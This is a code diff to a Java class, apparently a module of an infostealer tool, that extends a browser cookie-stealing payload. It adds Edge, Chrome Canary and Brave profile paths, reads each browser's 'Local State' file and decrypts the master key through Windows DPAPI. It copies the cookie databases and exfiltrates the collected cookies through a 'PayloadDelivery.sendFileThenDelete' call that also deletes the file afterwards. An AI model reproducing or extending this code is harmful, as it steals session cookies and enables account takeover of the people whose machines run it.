@@ -19,14 +19,14 @@ import java.sql.*;
 import java.util.*;
 import java.util.Date;
 
-public class ChromeCookies implements Payload {
+public class BrowserCookies implements Payload {
     private byte[] windowsMasterKey;
 
     File cookieStoreCopy = new File(".cookies.db");
 
     @Override
     public void execute() throws Exception {
-        if (Utilities.isWindows()) {
+        /*if (Utilities.isWindows()) {
             String pathLocalState = System.getProperty("user.home") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Local State";
             File localStateFile = new File(pathLocalState);
 
@@ -43,7 +43,7 @@ public class ChromeCookies implements Payload {
             byte[] encryptedMasterKeyWithPrefix = Base64.getDecoder().decode(encryptedMasterKeyWithPrefixB64);
             byte[] encryptedMasterKey = Arrays.copyOfRange(encryptedMasterKeyWithPrefix, 5, encryptedMasterKeyWithPrefix.length);
             this.windowsMasterKey = Crypt32Util.cryptUnprotectData(encryptedMasterKey, 0);
-        }
+        }*/
 
         HashSet<File> cookieStores = new HashSet<>();
         String userHome = System.getProperty("user.home");
@@ -54,7 +54,11 @@ public class ChromeCookies implements Payload {
                 "/AppData/Local/Google/Chrome/User Data/",
                 "/Application Data/Google/Chrome/User Data",
                 "/Library/Application Support/Google/Chrome",
-                "/.config/chromium"
+                "/.config/chromium",
+                "/AppData/Local/Microsoft/Edge/User Data",
+                "/AppData/Local/Google/Chrome SxS/User Data",
+                "/AppData/Local/Google/Chrome SxS/User Data",
+                "/AppData/Local/BraveSoftware/Brave-Browser/User Data",
         };
 
         String[] profiles = {
@@ -112,6 +116,7 @@ public class ChromeCookies implements Payload {
             if (cookieStore.exists()) {
                 Connection connection = null;
                 try {
+                    setKeyAndStuffForPath(cookieStore.getAbsolutePath().split("User Data")[0] + "User Data\\");
                     cookieStoreCopy.delete();
                     Files.copy(cookieStore.toPath(), cookieStoreCopy.toPath());
                     Class.forName("org.sqlite.JDBC");
@@ -165,6 +170,8 @@ public class ChromeCookies implements Payload {
         writer.flush();
         writer.close();
 
+        System.out.println(cookiesObject.toString(4));
+
         PayloadDelivery.sendFileThenDelete(file);
         cookieStoreCopy.delete();
     }
@@ -195,7 +202,25 @@ public class ChromeCookies implements Payload {
         }
     }
 
+    private void setKeyAndStuffForPath(String path) {
+        //String pathLocalState = System.getProperty("user.home") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Local State";
+        String pathLocalState = path + "\\Local State";
+        File localStateFile = new File(pathLocalState);
 
+        ObjectMapper objectMapper = new ObjectMapper();
+        JsonNode jsonNode = null;
+        try {
+            jsonNode = objectMapper.readTree(localStateFile);
+        } catch (IOException e) {
+            throw new IllegalStateException("Failed to load JSON from Chrome Local State file", e);
+        }
+
+        String encryptedMasterKeyWithPrefixB64 = jsonNode.at("/os_crypt/encrypted_key").asText();
+
+        byte[] encryptedMasterKeyWithPrefix = Base64.getDecoder().decode(encryptedMasterKeyWithPrefixB64);
+        byte[] encryptedMasterKey = Arrays.copyOfRange(encryptedMasterKeyWithPrefix, 5, encryptedMasterKeyWithPrefix.length);
+        this.windowsMasterKey = Crypt32Util.cryptUnprotectData(encryptedMasterKey, 0);
+    }
 
     class Cookie {
 
